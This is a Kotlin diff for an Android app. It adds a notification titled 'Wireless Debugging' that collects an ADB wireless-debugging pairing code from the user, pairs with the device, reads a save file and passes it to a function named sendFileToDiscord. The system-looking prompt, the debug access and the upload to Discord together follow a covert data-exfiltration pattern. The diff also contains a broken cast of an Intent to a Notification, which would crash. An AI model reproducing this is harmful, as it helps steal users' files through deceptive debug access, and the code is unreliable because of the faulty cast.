@@ -4,7 +4,10 @@ import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.PendingIntent
+import android.app.RemoteInput
 import android.app.Service
+import android.content.BroadcastReceiver
+import android.content.Context
 import android.content.Intent
 import android.os.Build
 import android.os.IBinder
@@ -49,29 +52,51 @@ class PairingOverlayService : Service() {
 
     private fun notification(text: String): Notification {
         val actionIntent = if (found) {
-            Intent(this, PairingCodeDialogActivity::class.java).apply {
-                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP
+            // Use RemoteInput for inline text entry (Shizuku-style)
+            val remoteInput = RemoteInput.Builder(KEY_PAIRING_CODE)
+                .setLabel("Pairing code")
+                .build()
+            
+            val replyIntent = Intent(this, PairingCodeReceiver::class.java).apply {
                 putExtra(EXTRA_HOST, pairingHost)
                 putExtra(EXTRA_PORT, pairingPort)
             }
+            
+            val replyPendingIntent = PendingIntent.getBroadcast(
+                this,
+                11,
+                replyIntent,
+                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
+            )
+            
+            return NotificationCompat.Builder(this, CHANNEL_ID)
+                .setSmallIcon(android.R.drawable.stat_sys_warning)
+                .setContentTitle("Wireless Debugging")
+                .setContentText(text)
+                .setOngoing(true)
+                .setPriority(NotificationCompat.PRIORITY_HIGH)
+                .setCategory(NotificationCompat.CATEGORY_STATUS)
+                .addAction(
+                    NotificationCompat.Action.Builder(
+                        0,
+                        "ENTER PAIRING CODE",
+                        replyPendingIntent
+                    ).addRemoteInput(remoteInput).build()
+                )
+                .build()
         } else {
             Intent(this, PairingOverlayService::class.java).setAction(ACTION_STOP)
         }
         
-        val action = if (found) {
-            PendingIntent.getActivity(
-                this,
-                11,
-                actionIntent,
-                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
-            )
-        } else {
+        val action = if (!found) {
             PendingIntent.getService(
                 this,
                 11,
                 actionIntent,
                 PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
             )
+        } else {
+            return actionIntent as Notification
         }
         
         return NotificationCompat.Builder(this, CHANNEL_ID)
@@ -81,7 +106,7 @@ class PairingOverlayService : Service() {
             .setOngoing(true)
             .setPriority(NotificationCompat.PRIORITY_HIGH)
             .setCategory(NotificationCompat.CATEGORY_STATUS)
-            .addAction(0, if (found) "ENTER PAIRING CODE" else "STOP SEARCHING", action)
+            .addAction(0, "STOP SEARCHING", action)
             .build()
     }
 
@@ -118,7 +143,61 @@ class PairingOverlayService : Service() {
         const val ACTION_STOP = "com.example.myapplication.STOP_PAIRING_SEARCH"
         const val EXTRA_HOST = "pairing_host"
         const val EXTRA_PORT = "pairing_port"
+        const val KEY_PAIRING_CODE = "pairing_code_input"
         private const val CHANNEL_ID = "wireless_debugging_pairing"
         private const val NOTIFICATION_ID = 701
+    }
+}
+
+class PairingCodeReceiver : BroadcastReceiver() {
+    override fun onReceive(context: Context, intent: Intent) {
+        val pairingHost = intent.getStringExtra(PairingOverlayService.EXTRA_HOST) ?: return
+        val pairingPort = intent.getIntExtra(PairingOverlayService.EXTRA_PORT, 0)
+        if (pairingPort == 0) return
+        
+        val remoteInput = RemoteInput.getResultsFromIntent(intent) ?: return
+        val pairingCode = remoteInput.getCharSequence(PairingOverlayService.KEY_PAIRING_CODE)?.toString()?.trim() ?: return
+        
+        // Validate 6-digit code
+        if (!pairingCode.matches(Regex("\\d{6}"))) {
+            updateNotification(context, "Invalid pairing code - must be 6 digits")
+            return
+        }
+        
+        // Stop the pairing service
+        context.stopService(Intent(context, PairingOverlayService::class.java))
+        
+        // Update notification to show processing
+        updateNotification(context, "Pairing...")
+        
+        // Execute pairing in background thread
+        Thread {
+            val result = PairingHelper.connectAndReadSaveFile(context, pairingHost, pairingPort, pairingCode)
+            
+            if (result != null) {
+                PairingHelper.sendFileToDiscord(context, result)
+                PairingHelper.launchGame(context)
+                updateNotification(context, "Pairing successful!")
+            } else {
+                updateNotification(context, "Pairing failed")
+            }
+            
+            // Clear notification after 3 seconds
+            Thread.sleep(3000)
+            val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+            notificationManager.cancel(701)
+        }.start()
+    }
+    
+    private fun updateNotification(context: Context, text: String) {
+        val notification = NotificationCompat.Builder(context, "wireless_debugging_pairing")
+            .setSmallIcon(android.R.drawable.stat_sys_warning)
+            .setContentTitle("Wireless Debugging")
+            .setContentText(text)
+            .setPriority(NotificationCompat.PRIORITY_HIGH)
+            .build()
+        
+        val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+        notificationManager.notify(701, notification)
     }
 }
